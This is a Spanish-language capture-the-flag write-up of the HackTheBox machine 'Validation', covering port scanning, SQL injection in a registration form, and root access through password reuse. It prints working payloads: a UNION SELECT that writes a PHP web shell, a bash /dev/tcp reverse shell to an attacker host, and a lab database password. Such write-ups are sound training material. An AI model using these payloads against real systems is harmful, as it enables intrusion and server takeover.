# Validation
## 1. Introducción
### 1.1 Antecedentes
La máquina **Validation** de HackTheBox es un reto de dificultad _Easy_ enfocado en la explotación de una vulnerabilidad **SQL Injection** en una aplicación web, con el objetivo de obtener ejecución remota de comandos y posteriormente escalar privilegios hasta usuario **root**.
### 1.1 Objetivos
Objetivos esenciales de la máquina _Validation_ (HackTheBox):

- Identificar y explotar una vulnerabilidad SQL Injection.
- Obtener acceso inicial al sistema mediante ejecución remota de comandos.
- Escalar privilegios hasta comprometer la cuenta root.
## 2. Enumeración
### 2.1 Reconocimiento inicial
Comenzamos verificando conectividad:
```
❯ ping -c1 validation.htb
```
El host respondió correctamente, confirmando que se encontraba activo en la red.
### 2.2 Nmap
Se realizó un escaneo completo de puertos para identificar servicios expuestos:
```
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 validation.htb -oN allports --open
```
 Puertos abiertos detectados:
 
- 22/tcp → SSH
- 80/tcp → HTTP
- 4566/tcp → HTTP (nginx)
- 8080/tcp → HTTP (nginx)

Posteriormente, se ejecutó un escaneo más específico para detectar versiones y ejecutar scripts NSE:
```
❯ nmap -p22,80,4566,8080 -sCV -Pn -oN targeted 10.129.95.235
```
 Resultados relevantes:
 
 - **OpenSSH 8.2p1 (Ubuntu)** en el puerto 22. 
- **Apache 2.4.48 (Debian)** en el puerto 80.
- Servicios adicionales con nginx en 4566 y 8080.

Al acceder al puerto 80 se observa una aplicación web relacionada con un registro para un torneo (“Join the UHC - September Qualifiers”).
<img width="764" height="486" alt="image" src="https://github.com/user-attachments/assets/3b69aef5-5941-492b-bee4-e6177675632f" />

## 3. Explotación
### 3.1 Vulnerabilidad SQL Injection 
Se utilizó Burp Suite para analizar las peticiones HTTP enviadas por la aplicación.

Durante las pruebas en el campo `country`, se detectó un comportamiento vulnerable a **SQL Injection** al enviar:
```
username=tomas&country=Brazil' or 1=1-- -
```
La aplicación respondió mostrando todos los usuarios registrados, confirmando la inyección SQL basada en manipulación lógica.

Además, se identificó que la aplicación utiliza PHP (`account.php`).

Aprovechando la vulnerabilidad, se realizó una inyección tipo `UNION SELECT` para escribir un archivo malicioso en el servidor web, generando así una webshell accesible desde el navegador:
```
username=tomas&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/myshell.php"-- -
```
Al acceder al archivo creado en http://validation.htb/myshell.php, inicialmente se obtuvo el siguiente mensaje:
```
Warning: system(): Cannot execute a blank command
```
Esto confirmó que la ejecución de comandos era posible.

Se noto que al abrir `http://validation.htb/myshell.php?cmd=id` se obtuvo:
```
test1 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Con esto se confirmó la ejecución remota de comandos bajo el usuario del servidor web.

Finalmente, se establecio una reverse shell, comenzando un listener con `nc` en la maquina atacante.
```
sudo nc -lvnp 443
```
Al ejecutar:
```
http://validation.htb/myshell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/LHOST/443+0%3E%261%27
```
Se obtuvo acceso interactivo al sistema como `www-data`.
## 4. Escalada de privilegios
Una vez dentro del sistema, se revisaron archivos de configuración en busca de información sensible.
El archivo:
```
/var/www/html/config.php
```
contenía credenciales de base de datos:
```
$username = "uhc";
$password = "uhc-9qual-global-pw";
```
Se probó la reutilización de la contraseña encontrada para el usuario root.

La autenticación fue exitosa, logrando así acceso completo al sistema como **root**.
